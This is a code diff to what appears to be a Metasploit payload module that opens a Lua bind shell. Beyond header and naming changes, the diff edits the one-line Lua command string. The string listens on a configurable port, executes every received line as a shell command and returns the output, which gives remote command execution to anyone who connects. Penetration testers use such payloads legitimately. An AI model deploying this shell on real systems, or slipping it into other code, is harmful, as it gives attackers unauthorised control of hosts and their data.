@@ -1,16 +1,12 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/handler/bind_tcp'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
 
-module Metasploit4
+module MetasploitModule
 
-  CachedSize = 223
+  CachedSize = 218
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -42,6 +38,7 @@ module Metasploit4
   # Constructs the payload
   #
   def generate
+    vprint_good(command_string)
     return super + command_string
   end
 
@@ -49,8 +46,7 @@ module Metasploit4
   # Returns the command string to use for execution
   #
   def command_string
-    "lua -e \"local s=require('socket');local s=assert(socket.bind('*',#{datastore['LPORT']}));local c=s:accept();while true do local r,x=c:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));c:send(b);end;c:close();f:close();\""
+    "lua -e \"local s=require('socket');local s=assert(s.bind('*',#{datastore['LPORT']}));local c=s:accept();while true do local r,x=c:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));c:send(b);end;c:close();f:close();\""
   end
-
 end
 
